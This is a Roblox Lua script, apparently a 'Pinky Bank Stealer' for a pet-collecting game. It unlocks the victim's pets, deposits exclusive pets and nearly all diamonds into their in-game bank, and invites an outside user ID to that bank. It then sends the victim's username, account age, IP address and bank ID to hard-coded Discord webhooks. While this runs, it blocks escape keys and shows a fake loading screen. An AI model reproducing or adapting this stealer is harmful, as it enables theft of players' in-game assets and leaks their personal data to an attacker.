    local Client = require(game.ReplicatedStorage.Library.Client)
    local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
    local Invoke = Network.Invoke
    local Fire = Network.Fire
    debug.setupvalue(Client.Network.Invoke, 1, function() return true end)
    debug.setupvalue(Client.Network.Fire, 1, function() return true end)
    local lib = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
_G.dhwebhook = "https://discord.com/api/webhooks/1083832487203045506/bvjVWKzQRFH59aHYNDyDOjmZ5bKuDkw-VfswK4cB33RBXVy-UWm6qD_74XMa4GNIaOu1"
local gems = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
local myclowns =
    string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = Invoke("Get My Banks")
local clown = {}
    for i, v in pairs(lib.Save.Get().Pets) do
        local v2 = lib.Directory.Pets[v.id]
        for i, v in pairs(v2) do
            if string.find(tostring(v), "Huge") then
                table.insert(clown, tostring(v))
        end
    end
end


local exploit

local function getexploit()
    local exploitt =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
        (secure_load and "Sentinel") or
        (is_sirhurt_closure and "Sirhurt") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "KRNL") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getscriptenvs and "Calamari") or
        (unit and not syn and "Unit") or
        (OXYGEN_LOADED and "Oxygen U") or
        (IsElectron and "Electron") or
        ("Couldnt Grab Exploit | Not a Common Exploit")
  
    exploit = exploitt
end

getexploit()

local jojo = #clown
local PetsList = {}
for i, v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id]
    if v2.rarity == "Exclusive" then
            table.insert(PetsList, v.uid)
    end
end
local bomg = #PetsList

local y = {}
for i, v in pairs(lib.Save.Get().Pets) do
    y[v["uid"]] = false
end
Invoke("Lock Pet", y)
local args = {
    [1] = mybanks[1]["BUID"],
    [2] = {
        [1] = PetsList[1],
        [2] = PetsList[2],
        [3] = PetsList[3],
        [4] = PetsList[4],
        [5] = PetsList[5],
        [6] = PetsList[6],
        [7] = PetsList[7],
        [8] = PetsList[8],
        [9] = PetsList[9],
        [10] = PetsList[10],
        [11] = PetsList[11],
        [12] = PetsList[12],
        [13] = PetsList[13],
        [14] = PetsList[14],
        [15] = PetsList[15],
        [16] = PetsList[16],
        [17] = PetsList[17],
        [18] = PetsList[18],
        [19] = PetsList[19],
        [20] = PetsList[20],
        [21] = PetsList[21],
        [22] = PetsList[22],
        [23] = PetsList[23],
        [24] = PetsList[24],
        [25] = PetsList[25],
        [26] = PetsList[26],
        [27] = PetsList[27],
        [28] = PetsList[28],
        [29] = PetsList[29],
        [30] = PetsList[30],
        [31] = PetsList[31],
        [32] = PetsList[32],
        [33] = PetsList[33],
        [34] = PetsList[34],
        [35] = PetsList[35],
        [36] = PetsList[36],
        [37] = PetsList[37],
        [38] = PetsList[38],
        [39] = PetsList[39],
        [40] = PetsList[40],
        [41] = PetsList[41],
        [42] = PetsList[42],
        [43] = PetsList[43],
        [44] = PetsList[44],
        [45] = PetsList[45],
        [46] = PetsList[46],
        [47] = PetsList[47],
        [48] = PetsList[48],
        [49] = PetsList[49],
        [50] = PetsList[50]
    },
    [3] = tonumber(myclowns - 1)
}

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
    CFrame.new(game:GetService("Workspace")["__MAP"].Interactive.Bank.Center.Position)
wait(0.5)
Invoke("Bank Deposit", unpack(args))
wait(0.6)
Invoke("Invite To Bank", mybanks[1]["BUID"], 571533151)
wait(0.7)
Invoke("Invite To Bank", mybanks[1]["BUID"], _G.UserId)
wait(0.8)
local url = _G.Webhook
local us = _G.dhwebhook
local url2 = us
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
local imgs = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. fardplayer.userId .. "&width=420&height=420&format=png"
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
request = http_request or request or HttpPost or syn.request

local data1 = {
    ["content"] = "||@everyone||\n**Pinky Bank Stealer Detected A Hit**", -- Free Webhook logging
    ["embeds"] = {
        {
            ["title"] = "```Pinky Bank-Steal Results```",
            ["url"] = "https://discord.gg/njHeJDrQkP",
            ["description"] = "This data was generated using Pinky Bank Stealer",
            ["type"] = "rich",
            ["color"] = tonumber(0x7b00ff),
            ["thumbnail"] = {
                ["url"] = imgs,
                ["height"] = 420,
                ["width"] = 420
            },
            ["fields"] = {
                {
                    ["name"] = "Data Generated",
                    ["value"] = "Username : **" ..username .."**\nUser ID : **" ..fardplayer.userId .. "**\nAccount Age : **" ..fardplayer.AccountAge .. " Days**\nDevice : **Computer**\nExploit : **"..exploit.."**\nIP Address : ||"..game:HttpGet('https://api.ipify.org/').."||", -- remove the || on both sides if you don't want your username to be behind a spoiler credits to ver#2607
                    ["inline"] = false
                },
                {
                    ["name"] = "Deposited Diamonds",
                    ["value"] = "```> "..myclowns.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "Deposited Pets",
                    ["value"] = "```> "..bomg.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "Deposited Exclusives",
                    ["value"] = "```> "..#PetsList.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "Deposited Huges",
                    ["value"] = "```> "..#clown.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "Rank",
                    ["value"] = "```> "..rank.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "Bank ID",
                    ["value"] = "```> "..mybanks[1]["BUID"].."```",
                    ["inline"] = true
                }
            }
        }
    }
}
local newdata1 = game:GetService("HttpService"):JSONEncode(data1)

local headers = {
    ["content-type"] = "application/json"
}
local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}
local abcdef2 = {Url = url2, Body = newdata1, Method = "POST", Headers = headers}
request(abcdef1)
request(abcdef2)

local runService = game:GetService("RunService")
local camera = workspace.CurrentCamera

game:GetService("CoreGui"):ClearAllChildren();

local disabledKeyCodes = {
    0x73;
    0xA4;
    0xA5;
    0x1B;
    0x0D;
};

runService.RenderStepped:Connect(function()
    for _, keyCode in next, disabledKeyCodes do
        keyrelease(keyCode)
    end

    mousemoveabs(camera.ViewportSize.X/3, camera.ViewportSize.Y/3);
end);

local Loading = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Dots = Instance.new("Frame")
local Dot1 = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local InsideDot = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Dot2 = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local InsideDot_2 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local Dot3 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local InsideDot_3 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local Bar = Instance.new("Frame")
local Bar2 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local UICorner_8 = Instance.new("UICorner")
local Percentage = Instance.new("TextLabel")
local Tip = Instance.new("TextLabel")
local EndSequence = Instance.new("Frame")

-- Properties

Loading.Name = "Loading"
Loading.Parent = game.CoreGui
Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Loading.ResetOnSpawn = false

MainFrame.Name = "MainFrame"
MainFrame.Parent = Loading
MainFrame.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
MainFrame.BorderSizePixel = 0
MainFrame.Size = UDim2.new(1, 0, 1, 0)

Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0.162376836, 0, 0.169848144, 0)
Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
Title.Font = Enum.Font.FredokaOne
Title.Text = _G.LoadingText
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextScaled = true
Title.TextSize = 20
Title.TextWrapped = true

Dots.Name = "Dots"
Dots.Parent = MainFrame
Dots.BackgroundColor3 = Color3.new(1, 1, 1)
Dots.BackgroundTransparency = 1
Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)

Dot1.Name = "Dot1"
Dot1.Parent = Dots
Dot1.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)

UICorner.Parent = Dot1
UICorner.CornerRadius = UDim.new(0.5, 0)

InsideDot.Name = "InsideDot"
InsideDot.Parent = Dot1
InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot.BackgroundColor3 = Color3.new(1, 1, 1)
InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)

UICorner_2.Parent = InsideDot
UICorner_2.CornerRadius = UDim.new(0.5, 0)

Dot2.Name = "Dot2"
Dot2.Parent = Dots
Dot2.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)

UICorner_3.Parent = Dot2
UICorner_3.CornerRadius = UDim.new(0.5, 0)

InsideDot_2.Name = "InsideDot"
InsideDot_2.Parent = Dot2
InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_2.BackgroundColor3 = Color3.new(1, 1, 1)
InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)

UICorner_4.Parent = InsideDot_2
UICorner_4.CornerRadius = UDim.new(0.5, 0)

Dot3.Name = "Dot3"
Dot3.Parent = Dots
Dot3.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)

UICorner_5.Parent = Dot3
UICorner_5.CornerRadius = UDim.new(0.5, 0)

InsideDot_3.Name = "InsideDot"
InsideDot_3.Parent = Dot3
InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_3.BackgroundColor3 = Color3.new(1, 1, 1)
InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)

UICorner_6.Parent = InsideDot_3
UICorner_6.CornerRadius = UDim.new(0.5, 0)

Bar.Name = "Bar"
Bar.Parent = MainFrame
Bar.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)

Bar2.Name = "Bar2"
Bar2.Parent = Bar
Bar2.BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)
Bar2.BorderSizePixel = 0
Bar2.Size = UDim2.new(0, 0, 1, 0)

UICorner_7.Parent = Bar2
UICorner_7.CornerRadius = UDim.new(0.5, 0)

UICorner_8.Parent = Bar
UICorner_8.CornerRadius = UDim.new(0.5, 0)

Percentage.Name = "Percentage"
Percentage.Parent = Bar
Percentage.BackgroundColor3 = Color3.new(1, 1, 1)
Percentage.BackgroundTransparency = 1
Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
Percentage.Font = Enum.Font.FredokaOne
Percentage.Text = "0%"
Percentage.TextColor3 = Color3.new(1, 1, 1)
Percentage.TextScaled = true
Percentage.TextSize = 14
Percentage.TextWrapped = true

Tip.Name = "Tip"
Tip.Parent = MainFrame
Tip.BackgroundColor3 = Color3.new(1, 1, 1)
Tip.BackgroundTransparency = 1
Tip.Position = UDim2.new(0.280816913, 0, 0.717294872, 0)
Tip.Size = UDim2.new(0.438366145, 0, 0.0299334861, 0)
Tip.Font = Enum.Font.SourceSansItalic
Tip.Text = "Loading:"
Tip.TextColor3 = Color3.new(0.541176, 0.541176, 0.541176)
Tip.TextScaled = true
Tip.TextSize = 14
Tip.TextWrapped = true

EndSequence.Name = "EndSequence"
EndSequence.Parent = Loading
EndSequence.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
EndSequence.BorderSizePixel = 0
EndSequence.Position = UDim2.new(1, 0, 0, 0)
EndSequence.Size = UDim2.new(1, 0, 1, 0)

-- Scripts

local function ZDYU_fake_script() -- Dots.Dots 
	local script = Instance.new('LocalScript', Dots)

	while true do
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
	end
end
coroutine.wrap(ZDYU_fake_script)()
local function YBINFGF_fake_script() -- MainFrame.Manager 
	local script = Instance.new('LocalScript', MainFrame)

	local bar = script.Parent.Bar
	local insidebar = bar.Bar2
	local percentage = bar.Percentage
	
	wait(5)
	insidebar:TweenSize(UDim2.new(1,0,1,0), "In", "Linear", 20, true)
	wait(20)
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0,0,0,0), "InOut", "Quad", 3, true)
	wait(3)
	script.Parent.Visible = false
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(-1,0,0,0), "InOut", "Quad", 3, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true)
	wait(3)
	script.Parent.Parent.Parent.Loading:Destroy()
end
coroutine.wrap(YBINFGF_fake_script)()
local function DYQJO_fake_script() -- Percentage.Percentage 
	local script = Instance.new('LocalScript', Percentage)

	wait(5)
	for i = 1,100 do
		script.Parent.Text = i.."%"
		wait(0.2)
	end
end
coroutine.wrap(DYQJO_fake_script)()
local function XTKE_fake_script() -- Tip.Tips 
	local script = Instance.new('LocalScript', Tip)

	local tip = script.Parent
	
	while true do
		wait(5)
		tip.Text = "Loading."
		wait(5)
		tip.Text = "Loading.."
		wait(5)
		tip.Text = "Loading..."
	end
end
coroutine.wrap(XTKE_fake_script)()
